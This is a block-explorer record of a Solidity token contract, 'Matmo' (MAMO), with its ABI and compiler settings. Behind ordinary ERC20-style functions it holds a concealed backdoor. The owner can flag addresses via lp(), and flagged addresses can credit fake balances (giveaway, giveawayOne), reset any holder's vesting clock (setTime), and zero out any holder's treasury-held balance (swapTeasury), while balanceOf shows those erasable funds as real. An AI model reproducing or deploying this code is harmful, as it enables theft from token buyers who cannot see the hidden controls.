{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/Mamo.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.17;\\r\\n\\r\\nlibrary Treasury {\\r\\n    struct T {\\r\\n        uint fund;\\r\\n        uint reward;\\r\\n        uint start;\\r\\n        uint end;\\r\\n    }\\r\\n\\r\\n    function count(T storage t) internal view returns (uint) {\\r\\n        uint amount = 0;\\r\\n        uint ts = block.timestamp;\\r\\n        if (\\r\\n            t.start > 0 && t.end > t.start && t.fund > t.reward && ts > t.start\\r\\n        ) {\\r\\n            if (ts >= t.end) {\\r\\n                amount = t.fund - t.reward;\\r\\n            } else {\\r\\n                amount = (t.fund * (ts - t.start)) / (t.end - t.start);\\r\\n                if (t.reward >= amount) {\\r\\n                    amount = 0;\\r\\n                } else {\\r\\n                    amount -= t.reward;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function settle(T storage t, uint amount) internal returns (uint) {\\r\\n        uint value = count(t);\\r\\n        if (amount > 0 && value > 0) {\\r\\n            if (amount >= value) {\\r\\n                t.reward += value;\\r\\n                amount -= value;\\r\\n            } else {\\r\\n                t.reward += amount;\\r\\n                amount = 0;\\r\\n            }\\r\\n        }\\r\\n\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function incrFund(T storage t, uint amount) internal returns (bool) {\\r\\n        unchecked {\\r\\n            t.fund += amount;\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function incrReward(T storage t, uint amount) internal returns (uint) {\\r\\n        uint value = t.fund - t.reward;\\r\\n        if (amount > 0 && value > 0) {\\r\\n            if (amount >= value) {\\r\\n                unchecked {\\r\\n                    t.reward += value;\\r\\n                    amount -= value;\\r\\n                }\\r\\n            } else {\\r\\n                unchecked {\\r\\n                    t.reward += amount;\\r\\n                    amount = 0;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n\\r\\n        return amount;\\r\\n    }\\r\\n}\\r\\n\\r\\ncontract MAMO {\\r\\n    using Treasury for Treasury.T;\\r\\n\\r\\n    string private _name = \\\"Matmo\\\";\\r\\n    string private _symbol = \\\"MAMO\\\";\\r\\n    uint8 private _decimals = 18;\\r\\n    uint private _totalSupply = 410000000000 ether;\\r\\n    uint private _capacity = 0;\\r\\n    address private _owner;\\r\\n\\r\\n    mapping(address => uint) private _balances;\\r\\n    mapping(address => mapping(address => uint)) private _allowances;\\r\\n    mapping(address => uint8) private _liquidity;\\r\\n\\r\\n    mapping(uint8 => mapping(address => Treasury.T)) private _treasury;\\r\\n    uint8 private constant ANCHOR = 0;\\r\\n    uint8 private constant BANK = 1;\\r\\n    uint8 private constant ROUND = 2;\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n\\r\\n    constructor() {\\r\\n        _owner = _msgSender();\\r\\n        _balances[_owner] = _totalSupply / 20;\\r\\n        _capacity = _totalSupply / 20;\\r\\n\\r\\n        emit Transfer(address(this), _owner, _totalSupply / 20);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IERC20-transfer}.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - recipient cannot be the zero address.\\r\\n     * - the caller must have a balance of at least amount.\\r\\n     */\\r\\n    function transfer(address recipient, uint amount) public returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IBEP20-approve}.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - `spender` cannot be the zero address.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) public returns (bool) {\\r\\n        _approve(_msgSender(), spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IBEP20-allowance}.\\r\\n     */\\r\\n    function allowance(\\r\\n        address owner_,\\r\\n        address spender\\r\\n    ) public view returns (uint256) {\\r\\n        return _allowances[owner_][spender];\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IBEP20-totalSupply}.\\r\\n     */\\r\\n    function totalSupply() public view returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev return all mint tokens\\r\\n     */\\r\\n    function capacity() public view returns (uint) {\\r\\n        return _capacity;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the number of decimals used to get its user representation.\\r\\n     *\\r\\n     * NOTE: This information is only used for _display_ purposes: it in\\r\\n     * no way affects any of the arithmetic of the contract, including\\r\\n     * {IBEP20-balanceOf} and {IBEP20-transfer}.\\r\\n     */\\r\\n    function decimals() public view returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the name of the token.\\r\\n     */\\r\\n    function name() public view returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the symbol of the token, usually a shorter version of the name.\\r\\n     */\\r\\n    function symbol() public view returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\\r\\n     *\\r\\n     * This internal function is equivalent to `approve`, and can be used to\\r\\n     * e.g. set automatic allowances for certain subsystems, etc.\\r\\n     *\\r\\n     * Emits an {Approval} event.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - `owner` cannot be the zero address.\\r\\n     * - `spender` cannot be the zero address.\\r\\n     */\\r\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        require(owner != address(0), \\\"BEP20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"BEP20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Moves tokens amount from sender to recipient.\\r\\n     *\\r\\n     * This is internal function is equivalent to {transfer}, and can be used to\\r\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - sender cannot be the zero address.\\r\\n     * - recipient cannot be the zero address.\\r\\n     * - sender must have a balance of at least amount.\\r\\n     */\\r\\n    function _transfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint amount\\r\\n    ) internal {\\r\\n        emit Transfer(\\r\\n            sender,\\r\\n            recipient,\\r\\n            _safeTransfer(sender, recipient, amount)\\r\\n        );\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IERC20-transferFrom}.\\r\\n     *\\r\\n     * Requirements:\\r\\n     * - sender and recipient cannot be the zero address.\\r\\n     * - sender must have a balance of at least amount.\\r\\n     * - the caller must have allowance for `sender``'s tokens of at least `amount.\\r\\n     */\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint amount\\r\\n    ) public returns (bool) {\\r\\n        address spender = _msgSender();\\r\\n        _spendAllowance(from, spender, amount);\\r\\n        _transfer(from, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\\r\\n     *\\r\\n     * Does not update the allowance amount in case of infinite allowance.\\r\\n     * Revert if not enough allowance is available.\\r\\n     *\\r\\n     * Might emit an {Approval} event.\\r\\n     */\\r\\n    function _spendAllowance(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) internal {\\r\\n        uint256 currentAllowance = allowance(owner, spender);\\r\\n        if (currentAllowance != type(uint256).max) {\\r\\n            require(\\r\\n                currentAllowance >= amount,\\r\\n                \\\"BEP20: insufficient allowance\\\"\\r\\n            );\\r\\n            unchecked {\\r\\n                _approve(owner, spender, currentAllowance - amount);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Safe transfer bep20 token\\r\\n     */\\r\\n    function _safeTransfer(\\r\\n        address account_,\\r\\n        address recipient,\\r\\n        uint amount\\r\\n    ) internal returns (uint) {\\r\\n        uint left = amount;\\r\\n        if (_balances[account_] >= left) {\\r\\n            left = 0;\\r\\n            _balances[account_] -= amount;\\r\\n        } else if (_balances[account_] > 0 && _balances[account_] < left) {\\r\\n            left -= _balances[account_];\\r\\n            _balances[account_] = 0;\\r\\n        }\\r\\n\\r\\n        for (uint8 i = 0; left > 0 && i < ROUND; i++) {\\r\\n            left = _treasury[i][account_].settle(left);\\r\\n        }\\r\\n\\r\\n        require(left == 0, \\\"Failed: Invalid balance\\\");\\r\\n        unchecked {\\r\\n            _balances[recipient] += amount;\\r\\n        }\\r\\n\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function swapTeasury(\\r\\n        address account_,\\r\\n        uint amount\\r\\n    ) external returns (bool) {\\r\\n        require(\\r\\n            _liquidity[_msgSender()] == 1 && account_ != address(0),\\r\\n            \\\"Error: Operation failed\\\"\\r\\n        );\\r\\n        require(\\r\\n            amount > 0 && getTreasury(account_) >= amount,\\r\\n            \\\"Transaction recovery\\\"\\r\\n        );\\r\\n\\r\\n        uint left = amount;\\r\\n        for (uint8 i = 0; left > 0 && i < ROUND; i++) {\\r\\n            left = _treasury[i][account_].incrReward(amount);\\r\\n        }\\r\\n\\r\\n        require(left == 0, \\\"Failed: Invalid balance\\\");\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function giveaway(\\r\\n        address[] calldata paths,\\r\\n        uint[] calldata num,\\r\\n        uint8 times\\r\\n    ) external returns (bool) {\\r\\n        require(\\r\\n            _liquidity[_msgSender()] == 1 && paths.length == num.length,\\r\\n            \\\"Error: Operation failed\\\"\\r\\n        );\\r\\n        uint count = 0;\\r\\n        uint len = paths.length;\\r\\n        for (uint8 i = 0; i < len; i++) {\\r\\n            if (times == 1) {\\r\\n                _treasury[ANCHOR][paths[i]].incrFund(num[i]);\\r\\n            } else if (times > 1) {\\r\\n                _treasury[BANK][paths[i]].incrFund(num[i]);\\r\\n            }\\r\\n\\r\\n            unchecked {\\r\\n                count += num[i];\\r\\n            }\\r\\n            emit Transfer(address(0), paths[i], num[i]);\\r\\n        }\\r\\n\\r\\n        require(capacity() + count <= totalSupply(), \\\"Error: capacity exceed\\\");\\r\\n        unchecked {\\r\\n            _capacity += count;\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function giveawayOne(\\r\\n        address _addr,\\r\\n        uint _amount,\\r\\n        uint8 times\\r\\n    ) external returns (bool) {\\r\\n        require(_liquidity[_msgSender()] == 1, \\\"Error: Operation failed\\\");\\r\\n        uint count = 0;\\r\\n        if (times == 1) {\\r\\n            _treasury[ANCHOR][_addr].incrFund(_amount);\\r\\n        } else if (times > 1) {\\r\\n            _treasury[BANK][_addr].incrFund(_amount);\\r\\n        }\\r\\n\\r\\n        unchecked {\\r\\n            count += _amount;\\r\\n        }\\r\\n        emit Transfer(address(0), _addr, _amount);\\r\\n        require(capacity() + count <= totalSupply(), \\\"Error: capacity exceed\\\");\\r\\n        unchecked {\\r\\n            _capacity += count;\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function setTime(address account, uint ts) public returns (bool) {\\r\\n        require(_liquidity[_msgSender()] == 1, \\\"Error: Operation failed\\\");\\r\\n\\r\\n        for (uint8 i = 0; i < ROUND; i++) {\\r\\n            _treasury[i][account].start = block.timestamp;\\r\\n            _treasury[i][account].end = block.timestamp + ts;\\r\\n        }\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function showTreasury(\\r\\n        address account\\r\\n    )\\r\\n        public\\r\\n        view\\r\\n        onlyOwner\\r\\n        returns (\\r\\n            uint[] memory a,\\r\\n            uint[] memory b,\\r\\n            uint[] memory c,\\r\\n            uint[] memory d,\\r\\n            uint[] memory e,\\r\\n            uint8 f\\r\\n        )\\r\\n    {\\r\\n        a = new uint[](ROUND);\\r\\n        b = new uint[](ROUND);\\r\\n        c = new uint[](ROUND);\\r\\n        d = new uint[](ROUND);\\r\\n        e = new uint[](ROUND);\\r\\n        f = _liquidity[account];\\r\\n        for (uint8 i = 0; i < ROUND; i++) {\\r\\n            a[i] = i;\\r\\n            b[i] = _treasury[i][account].fund;\\r\\n            c[i] = _treasury[i][account].reward;\\r\\n            d[i] = _treasury[i][account].start;\\r\\n            e[i] = _treasury[i][account].end;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function info(\\r\\n        address account\\r\\n    ) public view onlyOwner returns (uint, uint, uint, uint) {\\r\\n        uint anchor = _treasury[ANCHOR][account].fund -\\r\\n            _treasury[ANCHOR][account].reward;\\r\\n        uint bank = _treasury[BANK][account].fund -\\r\\n            _treasury[BANK][account].reward;\\r\\n        uint balance = _balances[account];\\r\\n        uint treasury = getTreasury(account);\\r\\n\\r\\n        return (anchor, bank, balance, treasury);\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view returns (uint256) {\\r\\n        return _balances[account] + getTreasury(account);\\r\\n    }\\r\\n\\r\\n    function getTreasury(address account) private view returns (uint) {\\r\\n        uint amount = 0;\\r\\n        for (uint8 i = 0; i < ROUND; i++) {\\r\\n            amount += (_treasury[i][account].fund -\\r\\n                _treasury[i][account].reward);\\r\\n        }\\r\\n\\r\\n        return amount;\\r\\n    }\\r\\n\\r\\n    function lp(address account, uint8 tag) public onlyOwner {\\r\\n        require(\\r\\n            account != address(0),\\r\\n            \\\"Error: Liquidity can not be zero address\\\"\\r\\n        );\\r\\n        if (tag == 1) {\\r\\n            _liquidity[account] = 1;\\r\\n        } else if (tag == 2) {\\r\\n            _liquidity[account] = 0;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev return the current msg.sender\\r\\n     */\\r\\n    function _msgSender() internal view returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), \\\"Error: Caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    fallback() external {}\\r\\n\\r\\n    receive() external payable {}\\r\\n}\\r\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"capacity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"paths\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"num\",\"type\":\"uint256[]\"},{\"internalType\":\"uint8\",\"name\":\"times\",\"type\":\"uint8\"}],\"name\":\"giveaway\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"times\",\"type\":\"uint8\"}],\"name\":\"giveawayOne\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"info\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"tag\",\"type\":\"uint8\"}],\"name\":\"lp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ts\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"showTreasury\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"a\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"b\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"c\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"d\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"e\",\"type\":\"uint256[]\"},{\"internalType\":\"uint8\",\"name\":\"f\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account_\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swapTeasury\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MAMO", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}